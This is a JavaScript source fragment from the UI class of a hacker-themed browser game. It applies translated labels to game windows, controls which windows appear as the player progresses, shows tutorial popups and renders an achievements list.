        this.audioToggleBtn.innerText = (audio && audio.enabled) ? dict.audioVolOn : dict.audioVolOff;
        this.audioToggleBtn.style.color = (audio && audio.enabled) ? "var(--neon-green)" : "var(--text-muted)";

        // 5. G.H.O.S.T. / Conquest Window
        document.querySelector("#win-ghost .window-title").innerText = dict.ghostTitle;
        const ghostTabs = document.querySelectorAll("#win-ghost .shop-tabs .tab-btn");
        ghostTabs[0].innerText = dict.tabConquest;
        ghostTabs[1].innerText = dict.tabGhost;
        document.querySelector(".conquest-summary h3").innerText = dict.conquestTitle;
        document.querySelector(".conquest-summary p").innerText = dict.conquestDesc;
        document.querySelector(".ai-name").innerHTML = `${dict.aiName}<span id="ai-level-txt">${state.aiLevel}</span>`;
        document.querySelector("#win-ghost .gauge-label").innerHTML = `${dict.aiExpLabel} <span id="ai-exp-txt" class="text-green">${state.aiExp.toLocaleString()} / ${(AI_LEVELS.find(l=>l.level===state.aiLevel)||AI_LEVELS[0]).requiredExp.toLocaleString()} EXP</span>`;
        this.aiLevelTxt = document.getElementById("ai-level-txt");
        this.aiExpTxt = document.getElementById("ai-exp-txt");

        this.feedAiBtn.innerText = dict.feedBtn;
        document.querySelector(".ai-skills-header").innerText = dict.skillsHeader;

        // 6. Tutorial Window
        document.querySelector("#win-tutorial .window-title").innerText = dict.tutorialTitle;
        document.querySelector(".tutorial-logo h2").innerText = dict.tutorialHeader;
        document.querySelector(".tutorial-logo h2").setAttribute("data-text", dict.tutorialHeader);
        document.querySelector(".tutorial-logo div").innerText = dict.tutorialSub;

        const steps = document.querySelectorAll(".tutorial-scroll-box div");
        steps[0].innerHTML = `<strong style="color: var(--neon-cyan); text-shadow: var(--glow-cyan);">${dict.step1Title}</strong><br>${dict.step1Desc}`;
        steps[1].innerHTML = `<strong style="color: var(--neon-cyan); text-shadow: var(--glow-cyan);">${dict.step2Title}</strong><br>${dict.step2Desc}`;
        steps[2].innerHTML = `<strong style="color: var(--neon-cyan); text-shadow: var(--glow-cyan);">${dict.step3Title}</strong><br>${dict.step3Desc}`;
        steps[3].innerHTML = `<strong style="color: var(--neon-cyan); text-shadow: var(--glow-cyan);">${dict.step4Title}</strong><br>${dict.step4Desc}`;
        steps[4].innerHTML = `<strong style="color: var(--neon-cyan); text-shadow: var(--glow-cyan);">${dict.step5Title}</strong><br>${dict.step5Desc}`;
        this.tutorialCloseBtn.querySelector(".hack-btn-text").innerText = dict.bootBtn;

        // 7. Cleaner Window
        document.querySelector("#win-clear-logs .window-title").innerText = dict.cleanerTitle;
        document.querySelector(".logs-cleaner-gauge .gauge-label").innerText = dict.cleanerExposure;
        document.querySelector(".logs-cleaner-gauge .gauge-sub").innerHTML = `${dict.cleanerPassive} <span id="cleaner-passive-shield" class="text-cyan">-${state.threatReduction.toFixed(2)}%/s</span>`;
        this.cleanerPassiveShield = document.getElementById("cleaner-passive-shield");
        this.cleanerScrubBtn.querySelector(".hack-btn-text").innerText = dict.cleanerScrubBtn;

        // 8. Mini-game Decryption Window
        document.querySelector("#win-intrusion .window-title").innerText = dict.intrusionTitle;
        document.querySelector(".intrusion-header span").innerText = dict.intrusionHeader;
        document.querySelector(".intrusion-header p").innerText = dict.intrusionSub;
        this.intrusionTimerTxt.innerText = `${dict.intrusionFooter} ${gameTimer}s`;

        // Float Alert Widget
        document.querySelector("#vuln-alert-widget .vuln-alert-text").innerText = dict.vulnAlertText;

        // --- PROGRESSIVE DISCLOSURE WINDOWS VISIBILITY CONTROL ---
        const terminalWin = document.getElementById("win-terminal");
        const shopWin = document.getElementById("win-shop");

        if (!state.tutorialRead) {
            terminalWin.style.display = "none";
            shopWin.style.display = "none";
            this.winClearLogs.style.display = "none";
            this.winGhost.style.display = "none";
            // Make sure Commlink is open
            document.getElementById("win-commlink").style.display = "flex";
        } else {
            terminalWin.style.display = "flex";
            shopWin.style.display = "flex";
            this.winClearLogs.style.display = state.isSecurityUnlocked ? "flex" : "none";
            this.winGhost.style.display = state.isGhostUnlocked ? "flex" : "none";
        }

        // Hide/show shop security tab dynamically
        tabs[1].style.display = state.isSecurityUnlocked ? "inline-block" : "none";
    }

    // Displays the tutorial window with custom dynamic content
    showTutorialPopup(type, state, onConfirmCallback) {
        const lang = state.language || "en";
        const dict = TRANSLATIONS[lang] || TRANSLATIONS["en"];

        let titleKey, headerKey, subKey, s1tKey, s1dKey, s2tKey, s2dKey, s3tKey, s3dKey, s4tKey, s4dKey, s5tKey, s5dKey, btnKey;

        if (type === "security") {
            titleKey = "secTutorialTitle";
            headerKey = "secTutorialHeader";
            subKey = "secTutorialSub";
            s1tKey = "secStep1Title"; s1dKey = "secStep1Desc";
            s2tKey = "secStep2Title"; s2dKey = "secStep2Desc";
            s3tKey = "secStep3Title"; s3dKey = "secStep3Desc";
            s4tKey = "secStep4Title"; s4dKey = "secStep4Desc";
            s5tKey = "secStep5Title"; s5dKey = "secStep5Desc";
            btnKey = "secBootBtn";
        } else if (type === "ghost") {
            titleKey = "ghostTutorialTitle";
            headerKey = "ghostTutorialHeader";
            subKey = "ghostTutorialSub";
            s1tKey = "ghostStep1Title"; s1dKey = "ghostStep1Desc";
            s2tKey = "ghostStep2Title"; s2dKey = "ghostStep2Desc";
            s3tKey = "ghostStep3Title"; s3dKey = "ghostStep3Desc";
            s4tKey = "ghostStep4Title"; s4dKey = "ghostStep4Desc";
            s5tKey = "ghostStep5Title"; s5dKey = "ghostStep5Desc";
            btnKey = "ghostBootBtn";
        } else {
            // Default onboarding
            titleKey = "tutorialTitle";
            headerKey = "tutorialHeader";
            subKey = "tutorialSub";
            s1tKey = "step1Title"; s1dKey = "step1Desc";
            s2tKey = "step2Title"; s2dKey = "step2Desc";
            s3tKey = "step3Title"; s3dKey = "step3Desc";
            s4tKey = "step4Title"; s4dKey = "step4Desc";
            s5tKey = "step5Title"; s5dKey = "step5Desc";
            btnKey = "bootBtn";
        }

        // Apply content to win-tutorial
        document.querySelector("#win-tutorial .window-title").innerText = dict[titleKey];
        document.querySelector(".tutorial-logo h2").innerText = dict[headerKey];
        document.querySelector(".tutorial-logo h2").setAttribute("data-text", dict[headerKey]);
        
        // Include architect credit only for onboarding type
        if (type === "onboarding" || type === "default" || type === undefined) {
            document.querySelector(".tutorial-logo div").innerHTML = `System Architect: <strong style="color: var(--neon-green); text-shadow: var(--glow-green);">LoikH</strong> | ${dict[subKey]}`;
        } else {
            document.querySelector(".tutorial-logo div").innerText = dict[subKey];
        }

        const steps = document.querySelectorAll(".tutorial-scroll-box div");
        steps[0].innerHTML = `<strong style="color: var(--neon-cyan); text-shadow: var(--glow-cyan);">${dict[s1tKey]}</strong><br>${dict[s1dKey]}`;
        steps[1].innerHTML = `<strong style="color: var(--neon-cyan); text-shadow: var(--glow-cyan);">${dict[s2tKey]}</strong><br>${dict[s2dKey]}`;
        steps[2].innerHTML = `<strong style="color: var(--neon-cyan); text-shadow: var(--glow-cyan);">${dict[s3tKey]}</strong><br>${dict[s3dKey]}`;
        steps[3].innerHTML = `<strong style="color: var(--neon-cyan); text-shadow: var(--glow-cyan);">${dict[s4tKey]}</strong><br>${dict[s4dKey]}`;
        steps[4].innerHTML = `<strong style="color: var(--neon-cyan); text-shadow: var(--glow-cyan);">${dict[s5tKey]}</strong><br>${dict[s5dKey]}`;
        this.tutorialCloseBtn.querySelector(".hack-btn-text").innerText = dict[btnKey];

        // Open the tutorial window and focus it
        this.winTutorial.style.display = "flex";
        this.focusWindow(this.winTutorial);

        // Bind the close button event dynamically (using cloneNode to prune previous listener bindings!)
        const newCloseBtn = this.tutorialCloseBtn.cloneNode(true);
        this.tutorialCloseBtn.parentNode.replaceChild(newCloseBtn, this.tutorialCloseBtn);
        this.tutorialCloseBtn = newCloseBtn;

        this.tutorialCloseBtn.addEventListener("click", () => {
            this.winTutorial.style.display = "none";
            if (onConfirmCallback) {
                onConfirmCallback();
            }
        });
    }

    // Renders the achievements list
    renderAchievements(state) {
        const lang = state.language || "en";
        this.achievementsList.innerHTML = "";

        ACHIEVEMENTS_DATA.forEach(ach => {
            const isUnlocked = state.unlockedAchievements.includes(ach.id);
            const data = ach[lang] || ach["en"];

            const item = document.createElement("div");
            item.className = `achievement-item ${isUnlocked ? "unlocked" : "locked"}`;
            item.style.display = "flex";
            item.style.alignItems = "center";
            item.style.gap = "12px";
            item.style.padding = "8px";
            item.style.border = "1px solid var(--border-dim)";
            item.style.borderRadius = "3px";
            item.style.background = isUnlocked ? "rgba(0, 255, 102, 0.05)" : "rgba(255, 255, 255, 0.02)";
            item.style.opacity = isUnlocked ? "1" : "0.5";

            item.innerHTML = `
                <div class="ach-icon" style="font-size: 1.5rem; filter: ${isUnlocked ? "none" : "grayscale(1)"};">${ach.icon}</div>
                <div class="ach-info">
                    <div class="ach-name" style="font-weight: bold; color: ${isUnlocked ? "var(--neon-green)" : "var(--text-muted)"};">${data.name}</div>
                    <div class="ach-desc" style="font-size: 0.75rem; color: var(--text-muted);">${data.desc}</div>
                </div>
                ${isUnlocked ? '<div class="ach-status" style="margin-left: auto; color: var(--neon-green); font-size: 0.7rem;">[COMPLETE]</div>' : ''}
            `;
            this.achievementsList.appendChild(item);
        });
    }
}
